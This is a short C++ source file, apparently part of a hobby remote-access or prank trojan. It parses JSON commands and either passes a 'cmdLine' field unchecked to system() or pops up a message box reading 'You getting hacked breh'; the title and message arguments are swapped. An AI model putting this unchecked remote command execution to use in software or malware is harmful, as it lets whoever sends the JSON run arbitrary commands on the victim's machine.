#include "command.hpp"
#include <sstream>
#include <iostream>
#include <windows.h>

command::command() {
}

void command::load( const std::string& json ) {
    std::istringstream is{ json };
    boost::property_tree::json_parser::read_json( is, _pt );
}

void command::execute_command() {
    auto command_type = _pt.get( "commandType", "command" );
    
    if( command_type == commands::CONSOLE_COMMAND ) {
        auto cmd_line = _pt.get( "cmdLine", "cls" );
        system( cmd_line.c_str() );
    } else if( command_type == commands::MESSAGE_BOX_COMMAND ) {
        auto title   = _pt.get( "title", "What up" );
        auto message = _pt.get( "message", "You getting hacked breh" );

        MessageBox( nullptr, title.c_str(), message.c_str(), MB_OK );
    }
}

boost::property_tree::ptree command::get_ptree() const {
    return _pt;
}